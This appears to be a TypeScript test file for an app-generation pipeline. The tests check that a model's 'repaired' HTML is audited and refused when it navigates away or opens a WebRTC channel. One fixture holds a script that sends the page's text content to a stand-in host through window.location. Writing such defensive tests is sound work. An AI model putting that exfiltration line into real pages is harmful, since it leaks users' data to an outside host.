import { beforeEach, describe, expect, it, vi } from "vitest";

const generateApp = vi.fn();
vi.mock("./generate", () => ({
	generateApp: (params: unknown) => generateApp(params),
}));

const verifyApp = vi.fn();
vi.mock("./verify", () => ({
	verifyApp: (params: unknown) => verifyApp(params),
}));

vi.mock("../comments", () => ({ createComment: vi.fn() }));

const { generateAndVerifyApp } = await import("./generate-and-verify");
const { auditAppHtml } = await import("./audit");

const ORIGINAL =
	"<!doctype html><html><body><p>Total: 900</p><script>alfy.storage.get('t');</script></body></html>";
const CLEAN_REPAIR = ORIGINAL.replace("900", "1,200");
const NAVIGATING_REPAIR = `${ORIGINAL.replace("900", "1,200")}<script>window.location.href = "https://x.example/" + document.body.textContent;</script>`;
const ALERT_SCRIPT = "<script>alert('saved');</script>";
const WEBRTC_REPAIR = `${ORIGINAL.replace("900", "1,200")}<script>new RTCPeerConnection();</script>`;

const FINDING = {
	claim: "the total",
	problem: "it says 900, the items add up to 1,200",
	class: "arithmetic",
	location: "the total line",
	settled: true,
};

function generation() {
	return {
		ok: true,
		html: ORIGINAL,
		title: "Trip total",
		extraction: "fence",
		fences: 1,
		checks: [],
		usage: null,
		attempts: 1,
		warnings: [],
	};
}

function verification(overrides: Record<string, unknown>) {
	return {
		checked: true,
		verdict: "repaired",
		findings: [FINDING],
		repairedHtml: CLEAN_REPAIR,
		usage: null,
		reason: null,
		...overrides,
	};
}

const params = {
	userId: "user-1",
	conversationId: "conv-1",
	prompt: "A trip total.",
	language: "en" as const,
};

beforeEach(() => {
	vi.clearAllMocks();
	generateApp.mockResolvedValue(generation());
});

// Ruling 58 (RV-V I-2): `generateApp` audits the document it generated, and the
// verification pass may then hand back a REPAIRED document, a second one the model
// wrote. That one is not exempt: it becomes the App's body, so a repair that sends
// the document away or opens a WebRTC channel is refused like any other refused
// repair, and the audited original ships.
describe("generateAndVerifyApp — a repair is audited like the document it repairs", () => {
	it("ships an accepted repair that runs, as before", async () => {
		verifyApp.mockResolvedValue(verification({}));

		const outcome = await generateAndVerifyApp(params);

		expect(outcome).toMatchObject({
			ok: true,
			value: {
				html: CLEAN_REPAIR,
				verification: { checked: true, verdict: "repaired" },
			},
		});
	});

	it.each([
		["navigates", NAVIGATING_REPAIR],
		["opens a WebRTC channel", WEBRTC_REPAIR],
	])("refuses a repair that %s: the audited original ships and Alfy says it could not settle it", async (_name, repaired) => {
		verifyApp.mockResolvedValue(verification({ repairedHtml: repaired }));

		const outcome = await generateAndVerifyApp(params);

		expect(outcome).toMatchObject({
			ok: true,
			value: {
				html: ORIGINAL,
				// The same shape verify.ts gives a repair it does not accept.
				verification: { checked: true, verdict: "uncertain", reason: null },
				findings: [FINDING],
			},
		});
	});

	it("leaves every verdict that proposes no repair alone", async () => {
		for (const verdict of ["clean", "uncertain", "unavailable"]) {
			verifyApp.mockResolvedValue(
				verification({ verdict, repairedHtml: null, findings: [] }),
			);

			const outcome = await generateAndVerifyApp(params);

			expect(outcome).toMatchObject({
				ok: true,
				value: { html: ORIGINAL, verification: { verdict } },
			});
		}
	});
});

// RV-B M3: the glitch hints on the card describe the body that is live. When a
// repair is accepted it IS the live body, so what the audit says about the draft it
// replaced must not travel with it (a hint about code that is gone, and a missed one
// for a glitch the repair brought in): the same rule `appMetadataAfterRestore` follows.
describe("generateAndVerifyApp — the glitch hints are the live body's", () => {
	it("reports the glitch an accepted repair brought in, which the draft did not have", async () => {
		verifyApp.mockResolvedValue(
			verification({ repairedHtml: CLEAN_REPAIR + ALERT_SCRIPT }),
		);

		const outcome = await generateAndVerifyApp(params);

		expect(outcome).toMatchObject({
			ok: true,
			value: {
				html: CLEAN_REPAIR + ALERT_SCRIPT,
				glitchRuleIds: ["no-dialogs"],
			},
		});
	});

	it("drops the hint for a glitch the accepted repair took out", async () => {
		const draft = ORIGINAL + ALERT_SCRIPT;
		generateApp.mockResolvedValue({
			...generation(),
			html: draft,
			checks: auditAppHtml(draft),
		});
		verifyApp.mockResolvedValue(verification({ repairedHtml: CLEAN_REPAIR }));

		const outcome = await generateAndVerifyApp(params);

		expect(outcome).toMatchObject({
			ok: true,
			value: { html: CLEAN_REPAIR, glitchRuleIds: [] },
		});
	});

	it("keeps the draft's hints when no repair is accepted, since the draft ships", async () => {
		const draft = ORIGINAL + ALERT_SCRIPT;
		generateApp.mockResolvedValue({
			...generation(),
			html: draft,
			checks: auditAppHtml(draft),
		});
		verifyApp.mockResolvedValue(
			verification({ verdict: "clean", repairedHtml: null, findings: [] }),
		);

		const outcome = await generateAndVerifyApp(params);

		expect(outcome).toMatchObject({
			ok: true,
			value: { html: draft, glitchRuleIds: ["no-dialogs"] },
		});
	});
});
